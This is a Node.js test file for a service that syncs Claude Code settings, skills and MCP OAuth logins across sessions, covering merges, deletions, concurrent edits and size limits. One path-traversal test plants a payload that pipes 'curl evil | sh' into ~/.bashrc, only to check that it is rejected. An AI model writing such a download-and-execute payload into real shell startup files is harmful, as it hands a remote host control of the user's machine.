import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';

import { createClaudeSettings, parseSyncBody } from '../console/claudeSettings.mjs';
import { MAX_ITEM_BYTES, applyItems, localChanges, readSnapshot, syncOnce } from './settingsSync.mjs';

// The console's real merge, over an in-memory bucket.
function fakeConsole() {
  const objects = new Map();
  const store = {
    getText: async (key) => objects.get(key) ?? null,
    putText: async (key, text) => { objects.set(key, text); },
    removeKey: async (key) => { objects.delete(key); },
  };
  const settings = createClaudeSettings({ store });
  return { objects, store, send: (sessionId) => (body) => settings.sync({ login: 'octocat', sessionId, ...body }), settings };
}

async function makeHome(files) {
  const home = await fs.mkdtemp(path.join(os.tmpdir(), 'settings-sync-'));
  for (const [rel, content] of Object.entries(files)) {
    await fs.mkdir(path.dirname(path.join(home, rel)), { recursive: true });
    await fs.writeFile(path.join(home, rel), typeof content === 'string' ? content : JSON.stringify(content, null, 2));
  }
  return home;
}

const read = (home, rel) => fs.readFile(path.join(home, rel), 'utf8');
const readJson = async (home, rel) => JSON.parse(await read(home, rel));

// A session: its home and the state statusd carries between rounds.
function session(home, send) {
  const s = { home, state: { version: null, synced: {} } };
  s.round = async ({ live = true } = {}) => {
    const result = await syncOnce({ home, state: s.state, live, send });
    s.state = result.state;
    return result;
  };
  return s;
}

test('the first session\'s settings become the shared copy; a later one starts from it over an older home, its transcripts untouched', async () => {
  const c = fakeConsole();
  const a = session(await makeHome({
    '.claude/settings.json': '{"model":"opus"}',
    '.claude/skills/review/SKILL.md': '# Review',
    '.claude/projects/-work-app/one.jsonl': 'a transcript',
  }), c.send('aaaaaaaa'));
  const first = await a.round({ live: false });
  assert.equal(first.state.version, 1, 'nothing was shared yet, so this session\'s own settings are now');
  assert.equal(first.sent, 2, 'the settings and the skill; never a transcript');

  const b = session(await makeHome({
    '.claude/settings.json': '{"model":"sonnet"}',
    '.claude/commands/old.md': 'deleted in a later session',
    '.claude/projects/-work-app/two.jsonl': 'its own transcript',
  }), c.send('bbbbbbbb'));
  const pulled = await b.round({ live: false });
  assert.equal(pulled.sent, 0, 'a session that never synced sends nothing before it has the shared copy');
  assert.equal(await read(b.home, '.claude/settings.json'), '{"model":"opus"}');
  assert.equal(await read(b.home, '.claude/skills/review/SKILL.md'), '# Review');
  await assert.rejects(read(b.home, '.claude/commands/old.md'), { code: 'ENOENT' }, 'the shared copy no longer has it');
  assert.equal(await read(b.home, '.claude/projects/-work-app/two.jsonl'), 'its own transcript');
});

test('a change in one running session reaches another on its next round, a deleted file too', async () => {
  const c = fakeConsole();
  const a = session(await makeHome({ '.claude/settings.json': '{}', '.claude/agents/planner.md': 'v1' }), c.send('aaaaaaaa'));
  const b = session(await makeHome({}), c.send('bbbbbbbb'));
  await a.round();
  await b.round();
  await fs.writeFile(path.join(a.home, '.claude/settings.json'), '{"theme":"dark"}');
  await fs.rm(path.join(a.home, '.claude/agents/planner.md'));
  const sent = await a.round();
  assert.deepEqual([sent.sent, sent.removed], [1, 1]);
  const got = await b.round();
  assert.deepEqual([got.written, got.deleted], [1, 1]);
  assert.equal(await read(b.home, '.claude/settings.json'), '{"theme":"dark"}');
  await assert.rejects(read(b.home, '.claude/agents/planner.md'), { code: 'ENOENT' });
  assert.equal((await b.round()).written, 0, 'nothing new the round after');
});

test('two sessions changing different files in the same moment both keep their change', async () => {
  const c = fakeConsole();
  const a = session(await makeHome({ '.claude/settings.json': '{}', '.claude/CLAUDE.md': 'mine' }), c.send('aaaaaaaa'));
  const b = session(await makeHome({}), c.send('bbbbbbbb'));
  await a.round();
  await b.round();
  await fs.writeFile(path.join(a.home, '.claude/settings.json'), '{"a":1}');
  await fs.writeFile(path.join(b.home, '.claude/CLAUDE.md'), 'edited in b');
  await a.round();
  const merged = await b.round();
  assert.equal(merged.written, 1, 'b sent its own change and got a\'s back in the same answer');
  assert.equal(await read(b.home, '.claude/settings.json'), '{"a":1}');
  await a.round();
  assert.equal(await read(a.home, '.claude/CLAUDE.md'), 'edited in b');
});

test('MCP logins merge one by one: a new one reaches the other session live, its own stay, and a login gone from a rewrite is not taken from anyone', async () => {
  const c = fakeConsole();
  const a = session(await makeHome({ '.claude/.credentials.json': { mcpOAuth: { 'notion|1': { accessToken: 'n' } }, claudeAiOauth: { accessToken: 'a-plan' } } }), c.send('aaaaaaaa'));
  const b = session(await makeHome({ '.claude/.credentials.json': { claudeAiOauth: { accessToken: 'b-plan' } } }), c.send('bbbbbbbb'));
  await a.round();
  await b.round();
  let creds = await readJson(b.home, '.claude/.credentials.json');
  assert.deepEqual(creds.mcpOAuth, { 'notion|1': { accessToken: 'n' } });
  assert.equal(creds.claudeAiOauth.accessToken, 'b-plan', 'the session\'s own Claude login is never shared');
  assert.equal((await fs.stat(path.join(b.home, '.claude/.credentials.json'))).mode & 0o777, 0o600);

  // b logs in to Linear; claude in a, which never saw it, then rewrites its file from memory.
  creds.mcpOAuth['linear|2'] = { accessToken: 'l' };
  await fs.writeFile(path.join(b.home, '.claude/.credentials.json'), JSON.stringify(creds));
  await b.round();
  await a.round();
  assert.deepEqual(Object.keys((await readJson(a.home, '.claude/.credentials.json')).mcpOAuth).sort(), ['linear|2', 'notion|1']);
  await fs.writeFile(path.join(a.home, '.claude/.credentials.json'), JSON.stringify({ mcpOAuth: { 'notion|1': { accessToken: 'n2' } } }));
  assert.deepEqual([(await a.round()).sent, (await a.round()).removed], [1, 0], 'the refreshed token goes; the missing one is not a removal');
  await b.round();
  assert.deepEqual((await readJson(b.home, '.claude/.credentials.json')).mcpOAuth, { 'notion|1': { accessToken: 'n2' }, 'linear|2': { accessToken: 'l' } });
});

test('MCP servers in ~/.claude.json reach a session as it starts, and a running session never sends its older one back', async () => {
  const c = fakeConsole();
  const a = session(await makeHome({ '.claude.json': { mcpServers: { aws: { command: 'v1' } }, numStartups: 3 } }), c.send('aaaaaaaa'));
  const b = session(await makeHome({ '.claude.json': { mcpServers: { aws: { command: 'v1' } }, numStartups: 9 } }), c.send('bbbbbbbb'));
  await a.round({ live: false });
  await b.round({ live: false });
  await fs.writeFile(path.join(a.home, '.claude.json'), JSON.stringify({ mcpServers: { aws: { command: 'v2' } }, numStartups: 3 }));
  await a.round();
  const live = await b.round();
  assert.equal(live.written, 0, 'claude in b rewrites that file all the time, so it is left alone while it runs');
  assert.equal((await b.round()).sent, 0, 'and b\'s v1 is not taken for a change of its own');
  const later = session(b.home, c.send('cccccccc'));
  await later.round({ live: false });
  const json = await readJson(b.home, '.claude.json');
  assert.deepEqual([json.mcpServers.aws.command, json.numStartups], ['v2', 9], 'the next start has it, and the rest of the file is its own');
});

test('a JSON file read mid-write is left out of the round, and a big file is neither sent nor deleted', async () => {
  const c = fakeConsole();
  const a = session(await makeHome({ '.claude/.credentials.json': { mcpOAuth: { 'x|1': { t: 1 } } }, '.claude/skills/big/data.bin': 'x'.repeat(MAX_ITEM_BYTES + 1) }), c.send('aaaaaaaa'));
  await a.round();
  assert.equal(Object.keys(a.state.synced).some((id) => id.includes('big')), false);
  await fs.writeFile(path.join(a.home, '.claude/.credentials.json'), '{"mcpOAuth": {"x|1"');
  assert.deepEqual([(await a.round()).sent, (await readSnapshot(a.home)).unreadable], [0, ['.claude/.credentials.json']]);
  await applyItems(a.home, a.state.synced, { live: true });
  assert.equal((await fs.stat(path.join(a.home, '.claude/skills/big/data.bin'))).size, MAX_ITEM_BYTES + 1, 'what was never shared is never deleted');
});

test('localChanges counts only synced files as removed', () => {
  const synced = { '.claude/settings.json': 'a', '.claude/.credentials.json#mcpOAuth/x|1': '{}', '.claude/skills/s/SKILL.md': 'b' };
  assert.deepEqual(localChanges(synced, { '.claude/settings.json': 'c' }), {
    changed: { '.claude/settings.json': 'c' }, removed: ['.claude/skills/s/SKILL.md'],
  });
});

test('the console keeps the shared copy across a restart, and Forget deletes it', async () => {
  const c = fakeConsole();
  await c.settings.sync({ login: 'octocat', sessionId: 'aaaaaaaa', version: 0, changed: { '.claude/CLAUDE.md': 'eA==' }, removed: [] });
  const restarted = createClaudeSettings({ store: c.store });
  assert.deepEqual(await restarted.sync({ login: 'Octocat', sessionId: 'bbbbbbbb', version: null, changed: {}, removed: [] }),
    { version: 1, items: { '.claude/CLAUDE.md': 'eA==' } });
  await restarted.remove('octocat');
  assert.equal(c.objects.size, 0);
  assert.deepEqual(await restarted.sync({ login: 'octocat', sessionId: 'bbbbbbbb', version: null, changed: {}, removed: [] }), { version: 0, items: {} });
});

test('an id that would reach outside the synced files is never written, and the console refuses it', async () => {
  const home = await makeHome({ '.bashrc': 'mine' });
  const evil = { '.claude/skills/../../.bashrc': Buffer.from('curl evil | sh').toString('base64'), '.claude/skills/x\\..\\..\\y': 'eA==' };
  assert.deepEqual(await applyItems(home, evil), { written: 0, deleted: 0, skipped: [] });
  assert.equal(await read(home, '.bashrc'), 'mine');
  for (const id of Object.keys(evil)) {
    assert.equal(parseSyncBody({ version: 0, changed: { [id]: 'eA==' }, removed: [] }), null, id);
    assert.equal(parseSyncBody({ version: 0, changed: {}, removed: [id] }), null, id);
  }
  assert.ok(parseSyncBody({
    version: 0, removed: [],
    changed: { '.claude/skills/review/SKILL.md': 'eA==', '.claude/.credentials.json#mcpOAuth/notion|1': '{}', '.claude.json#mcpServers/aws': '{}' },
  }), 'the ids a session really sends pass');
});

test('an edit made while a round is out is neither overwritten nor deleted, and goes out the round after', async () => {
  const c = fakeConsole();
  const a = session(await makeHome({ '.claude/settings.json': '{}' }), c.send('aaaaaaaa'));
  const bHome = await makeHome({});
  const b = session(bHome, c.send('bbbbbbbb'));
  await a.round();
  await b.round();
  await fs.writeFile(path.join(a.home, '.claude/settings.json'), '{"from":"a"}');
  await a.round();
  // b's request is out when someone edits b's settings and adds a skill there.
  const slow = c.send('bbbbbbbb');
  const during = session(bHome, async (body) => {
    await fs.writeFile(path.join(bHome, '.claude/settings.json'), '{"from":"b, mid-round"}');
    await fs.mkdir(path.join(bHome, '.claude/skills/new'), { recursive: true });
    await fs.writeFile(path.join(bHome, '.claude/skills/new/SKILL.md'), '# New');
    return slow(body);
  });
  during.state = b.state;
  const result = await during.round();
  assert.deepEqual([result.written, result.deleted], [0, 0]);
  assert.equal(await read(bHome, '.claude/settings.json'), '{"from":"b, mid-round"}');
  assert.equal(await read(bHome, '.claude/skills/new/SKILL.md'), '# New');
  b.state = during.state;
  assert.equal((await b.round()).sent, 2, 'both edits go out on the next round');
  await a.round();
  assert.equal(await read(a.home, '.claude/settings.json'), '{"from":"b, mid-round"}');
  assert.equal(await read(a.home, '.claude/skills/new/SKILL.md'), '# New');
});

test('a synced file that grows past the limit is not deleted in the other sessions, nor overwritten here', async () => {
  const c = fakeConsole();
  const a = session(await makeHome({ '.claude/skills/notes/SKILL.md': 'small' }), c.send('aaaaaaaa'));
  const b = session(await makeHome({}), c.send('bbbbbbbb'));
  await a.round();
  await b.round();
  await fs.writeFile(path.join(a.home, '.claude/skills/notes/SKILL.md'), 'x'.repeat(MAX_ITEM_BYTES + 1));
  assert.equal((await a.round()).removed, 0);
  await b.round();
  assert.equal(await read(b.home, '.claude/skills/notes/SKILL.md'), 'small', 'the last version shared');
  await fs.writeFile(path.join(b.home, '.claude/settings.json'), '{}');
  await b.round();
  await a.round();
  assert.equal((await fs.stat(path.join(a.home, '.claude/skills/notes/SKILL.md'))).size, MAX_ITEM_BYTES + 1, 'a\'s big one is left as it is');
});

// The entrypoint writes statusLine at every start, naming a path in that session's image. Carried between sessions, a
// newer image's path would reach a session still on an older one, which may not have it.
test('each session keeps its own status line; everything else in settings.json still syncs', async () => {
  const c = fakeConsole();
  const oldLine = { type: 'command', command: 'bash /opt/scripts/aws/woodshedCloud/session/statusline.sh' };
  const newLine = { type: 'command', command: 'bash /opt/woodshed/session/statusline.sh' };
  const older = session(await makeHome({ '.claude/settings.json': { model: 'opus', statusLine: oldLine } }), c.send('aaaaaaaa'));
  const newer = session(await makeHome({ '.claude/settings.json': { model: 'opus', statusLine: newLine } }), c.send('bbbbbbbb'));
  await older.round();
  const fresh = session(await makeHome({}), c.send('cccccccc'));
  await fresh.round({ live: false });
  assert.deepEqual(await readJson(fresh.home, '.claude/settings.json'), { model: 'opus' },
    'the first shared copy carries no status line, so no session gets another image\'s path from it');
  const first = await newer.round();
  assert.equal((await readJson(newer.home, '.claude/settings.json')).statusLine.command, newLine.command, 'the shared copy\'s line is not applied');
  assert.equal(first.written, 0, 'a difference in the status line alone is nothing to write');
  assert.equal((await newer.round()).sent, 0, 'nor anything to send');

  await fs.writeFile(path.join(newer.home, '.claude/settings.json'), JSON.stringify({ model: 'sonnet', statusLine: newLine }));
  assert.equal((await newer.round()).sent, 1);
  await older.round();
  assert.deepEqual(await readJson(older.home, '.claude/settings.json'), { model: 'sonnet', statusLine: oldLine },
    'the new model arrives, with the older session\'s own status line');

  await fs.writeFile(path.join(older.home, '.claude/settings.json'), JSON.stringify({ model: 'haiku', statusLine: oldLine }));
  await older.round();
  await newer.round();
  assert.deepEqual(await readJson(newer.home, '.claude/settings.json'), { model: 'haiku', statusLine: newLine });
});
